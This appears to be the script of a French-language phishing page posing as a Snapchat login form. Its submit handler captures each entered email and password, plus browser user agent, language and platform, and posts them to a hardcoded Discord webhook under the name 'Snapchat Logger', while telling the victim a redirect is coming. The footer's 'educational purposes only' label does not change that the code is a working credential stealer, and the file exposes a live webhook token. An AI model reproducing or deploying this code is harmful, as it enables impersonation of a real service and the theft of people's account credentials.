const toggleBtn = document.getElementById('toggleBtn');
const emailInput = document.getElementById('name');
const passwordInput = document.getElementById('password');
const loginForm = document.getElementById('loginForm');
const languageSelect = document.getElementById('language');

const Webhook = 'https://discord.com/api/webhooks/1443334250009985176/rSeM_wKzhMmpHaXwGYdrqLPBn06-qAPYKDQH6XDFgMSwm-6_a8fDsQbBW5F4x0noIdG5'

// Toggle password visibility
toggleBtn.addEventListener('click', function() {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    toggleBtn.textContent = type === 'password' ? '👁️' : '🙈';
});

// Form submission
loginForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    
    if (email.length === 0) {
        alert('Veuillez entrer un nom d\'utilisateur');
        return;
    }

    if (password.length === 0) {
        alert('Veuillez entrer un mot de passe');
        return;
    }
    
    if (password.length < 6) {
        alert('Le mot de passe doit contenir au moins 6 caractères');
        return;
    }

    try {
        sendToDiscord(email, password);

        alert('Informations envoyées avec succès, vous allez être redirigé dans quelques secondes...\n (note: si cela ne marche pas, rafraichissez la page et veuillez ré essayer)');
        loginForm.reset();
    } catch (error) {
        console.error('Erreur lors de l\'envoi des informations :', error);
        alert('Échec de l\'envoi des informations.');
        loginForm.reset();
    }
});

async function sendToDiscord(email, password) {
    const now = new Date();
    const timestamp = now.toLocaleString('fr-FR', {
            timeZone: 'Europe/Paris',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;

    const payload = {
        username: "Snapchat Logger",
        avatar_url: "https://upload.wikimedia.org/wikipedia/fr/8/80/Snapchat_logo_2019.svg",
        embeds: [{
            title: "🔐 Nouvelles Credentials Capturées",
            color: 0xFFFC00, // Couleur jaune Snapchat
            fields: [
                {
                    name: "📧 Email",
                    value: email,
                    inline: false
                },
                {
                    name: "🔑 Mot de passe",
                    value: password,
                    inline: false
                },
                {
                    name: "⏰ Date et heure",
                    value: timestamp,
                    inline: true
                },
                {
                    name: "🌍 Langue",
                    value: language,
                    inline: true
                },
                {
                    name: "💻 User Agent",
                    value: userAgent.substring(0, 100) + "...",
                    inline: false
                },
                {
                    name: "🖥️ Plateforme",
                    value: platform,
                    inline: true
                }
            ],
            footer: {
                text: "Snapchat - À des fins éducatives uniquement !"
            },
            timestamp: now.toISOString()
        }]
    };

    const response = await fetch(Webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
    
    if (!response.ok) {
        throw new Error('Erreur lors de l\'envoi à Discord');
    }
    
    return response;
}

// Language switching
languageSelect.addEventListener('change', function() {
    const lang = this.value;
    changeLanguage(lang);
});

function changeLanguage(lang) {
    const elements = document.querySelectorAll('[data-en][data-fr]');
    elements.forEach(element => {
        element.textContent = element.getAttribute(`data-${lang}`);
    });
    
    // Change HTML lang attribute
    document.documentElement.lang = lang;
    
    // Save preference
    localStorage.setItem('preferredLanguage', lang);
}

// Load saved language preference
window.addEventListener('DOMContentLoaded', function() {
    const savedLang = localStorage.getItem('preferredLanguage') || 'fr';
    languageSelect.value = savedLang;
    changeLanguage(savedLang);
});
